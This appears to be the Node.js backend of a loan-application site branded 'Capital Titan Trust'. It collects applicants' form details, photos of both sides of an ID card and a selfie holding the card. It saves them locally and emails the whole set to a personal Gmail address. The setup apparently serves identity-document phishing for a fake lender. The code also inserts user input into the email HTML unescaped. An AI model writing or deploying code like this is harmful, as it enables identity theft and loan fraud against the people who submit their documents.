const express = require('express');
const multer = require('multer');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

const app = express();

// Make sure folders exist
if (!fs.existsSync('uploads')) fs.mkdirSync('uploads', { recursive: true });
if (!fs.existsSync('application.json')) fs.writeFileSync('application.json', '[]');
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname) || '.jpg';
    cb(null, file.fieldname + '-' + Date.now() + '-' + Math.random().toString(36).slice(2,8) + ext);
  }
});
const upload = multer({ storage: storage }); 

app.use(express.static(path.join(__dirname, 'Public')));

// GMAIL - USE ENV OR DIRECT
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false,
  family: 4,
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_PASS
  }
});

let lastSend = 0;
let lastHash = '';

app.post('/apply', upload.fields([
  { name: 'IDCardFront', maxCount: 1 },
  { name: 'IDCardBack', maxCount: 1 },
  { name: 'selfieWithCard', maxCount: 1 }
]), async (req, res) => {

  // BLOCK DUPLICATE - FIXES YOUR 3 EMAILS ISSUE
  const now = Date.now();
  const hash = JSON.stringify(req.body);
  if (hash === lastHash && now - lastSend < 15000) {
    console.log('⚠️ DUPLICATE BLOCKED - Already sent');
    return res.json({ success: true, id: 'DUPLICATE' });
  }
  lastHash = hash;
  lastSend = now;

  const data = req.body;
  const id = 'CTT-' + Date.now();

  // 1. SAVE TO application.json (ROOT)
  let apps = [];
  try { apps = JSON.parse(fs.readFileSync('application.json', 'utf8')); } catch (e) { apps = []; }

  const entry = {
    id: id,
    date: new Date().toLocaleString(),
   ...data,
    images: {
      front: req.files?.IDCardFront?.[0]?.filename || null,
      back: req.files?.IDCardBack?.[0]?.filename || null,
      selfie: req.files?.selfieWithCard?.[0]?.filename || null
    }
  };
  apps.push(entry);
  fs.writeFileSync('application.json', JSON.stringify(apps, null, 2));

  // 2. SHOW IN VS CODE TERMINAL
  console.log('\n========================================');
  console.log(`🔥 NEW APPLICATION: ${id}`);
  console.log(JSON.stringify(entry, null, 2));
  console.log('========================================\n');

  // 3. SEND ONE EMAIL WITH ALL TEXT + FANCY IMAGES
  let attachments = [];
  if (req.files?.IDCardFront) attachments.push({ filename: 'Front.jpg', path: req.files.IDCardFront[0].path, cid: 'front' });
  if (req.files?.IDCardBack) attachments.push({ filename: 'Back.jpg', path: req.files.IDCardBack[0].path, cid: 'back' });
  if (req.files?.selfieWithCard) attachments.push({ filename: 'Selfie.jpg', path: req.files.selfieWithCard[0].path, cid: 'selfie' });

  let rows = '';
  for (let k in data) {
    rows += `<tr><td style="padding:10px;border:1px solid #ddd;background:#f5f5f5"><b>${k}</b></td><td style="padding:10px;border:1px solid #ddd">${data[k] || '-'}</td></tr>`;
  }

  const html = `
  <div style="font-family:Arial,sans-serif;max-width:700px;margin:auto;border:1px solid #ddd;background:#fff">
    <div style="background:#003366;color:white;padding:25px;text-align:center">
      <h1 style="margin:0">Capital Titan Trust</h1>
      <p style="margin:5px 0">✅ NEW LOAN APPLICATION</p>
      <p style="font-size:12px">ID: ${id} | ${new Date().toLocaleString()}</p>
    </div>
    <div style="padding:25px">
      <h3 style="color:#003366">Applicant Details - ALL RESULTS</h3>
      <table style="width:100%;border-collapse:collapse;font-size:14px">${rows}</table>

      <h3 style="color:#003366;margin-top:30px;border-bottom:2px solid #003366;padding-bottom:10px">📸 DOCUMENTS - FANCY VIEW</h3>
      ${req.files?.IDCardFront? `<div style="border:1px solid #ddd;padding:15px;margin:15px 0;border-radius:12px;text-align:center"><h4>ID FRONT</h4><img src="cid:front" style="width:100%;max-width:450px;border-radius:12px;border:3px solid #003366"></div>` : '<p>❌ No Front</p>'}
      ${req.files?.IDCardBack? `<div style="border:1px solid #ddd;padding:15px;margin:15px 0;border-radius:12px;text-align:center"><h4>ID BACK</h4><img src="cid:back" style="width:100%;max-width:450px;border-radius:12px;border:3px solid #003366"></div>` : '<p>❌ No Back</p>'}
      ${req.files?.selfieWithCard? `<div style="border:1px solid #ddd;padding:15px;margin:15px 0;border-radius:12px;text-align:center"><h4>SELFIE WITH ID</h4><img src="cid:selfie" style="width:100%;max-width:450px;border-radius:12px;border:3px solid #003366"></div>` : '<p>❌ No Selfie</p>'}
    </div>
    <div style="background:#f5f5f5;padding:10px;text-align:center;font-size:11px;color:#666">Capital Titan Trust - ${id}</div>
  </div>`;

  try {
    await transporter.sendMail({
      from: 'Capital Titan Trust <mikecoy27@gmail.com>',
      to: 'mikecoy27@gmail.com',
      subject: `🔥 NEW LOAN ${id} - ${data.firstName || ''} ${data.lastName || ''} - ${data.phone || ''}`,
      html: html,
      attachments: attachments
    });
    console.log(`✅ EMAIL SENT ONCE: ${id} to mikecoy27@gmail.com`);
  } catch (err) {
    console.error('❌ Email Error:', err.message);
    return res.status(500).json({ success: false, error: err.message });
  }

  // KEEP IMAGES - DO NOT DELETE
  res.json({ success: true, id: id, data: entry });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'Public', 'index.html'));
});

const PORT = process.env.PORT || 3002;
app.listen(PORT, () => {
  console.log(`\n✅ Server running on http://localhost:${PORT}`);
  console.log(`👉 Open: http://localhost:${PORT}\n`);
});